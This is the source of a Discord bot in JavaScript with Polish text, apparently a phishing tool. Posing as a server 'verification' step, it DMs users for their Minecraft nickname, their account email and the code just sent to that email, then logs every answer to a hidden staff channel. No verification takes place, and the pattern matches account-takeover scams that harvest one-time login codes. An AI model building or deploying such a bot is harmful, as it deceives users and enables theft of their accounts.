console.log(`[DEBUG] Bot uruchomiony z PID: ${process.pid} o ${new Date().toLocaleTimeString()}`);
 require('dotenv').config();
 const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events } = require('discord.js');
 require('dotenv').config();
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.DirectMessages
   ],
   partials: [Partials.Channel]
 });
 
 client.once('ready', () => {
   console.log(`Zalogowano jako ${client.user.tag}`);
 });
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
 
   if (interaction.customId === 'start_form') {
     await interaction.reply({ content: 'Zaraz zostaniesz zweryfikowany.', ephemeral: true });
 
     const questions = [
       'Twój nick w minecraft?',
       'Twój mail używany do minecrafta?',
       'Kod wysłany na adres mailowy?'
     ];
 
     const answers = [];
     const dmChannel = await interaction.user.createDM();
 
     for (let i = 0; i < questions.length; i++) {
       await dmChannel.send(questions[i]);
 
       const collected = await dmChannel.awaitMessages({
         max: 1,
         time: 60000,
         errors: ['time'],
         filter: m => m.author.id === interaction.user.id
       }).catch(() => null);
 
       if (!collected) {
         return dmChannel.send('Timeout.');
       }
 
       const answer = collected.first().content;
       answers.push(answer);
 
       // Logowanie po każdej odpowiedzi
       const logChannel = interaction.guild.channels.cache.find(channel => channel.name === 'logi-formularzy');
 
       if (logChannel && logChannel.isTextBased()) {
         const { EmbedBuilder } = require('discord.js');
 
         const embed = new EmbedBuilder()
           .setColor(0x00AE86)
           .setTitle('Nowa odpowiedź z formularza')
           .addFields(
             { name: 'Użytkownik', value: `${interaction.user.tag} (${interaction.user.id})` },
             { name: 'Pytanie', value: questions[i], inline: false },
             { name: 'Odpowiedź', value: answer, inline: false },
           )
           .setTimestamp();
 
         logChannel.send({ embeds: [embed] });
       }
     }
 
     
     dmChannel.send(`*Weryfikacja może trwać do 5 minut*`);
   }
 });
 
 client.on('messageCreate', async message => {
   if (message.content === '!start') {
     const button = new ButtonBuilder()
       .setCustomId('start_form')
       .setLabel('Zweryfikuj się')
       .setStyle(ButtonStyle.Primary);
 
     const row = new ActionRowBuilder().addComponents(button);
 
     await message.channel.send({
       content: 'Kliknij aby się zweryfikować',
       components: [row]
     });
   }
 });
 
 client.login(process.env.TOKEN);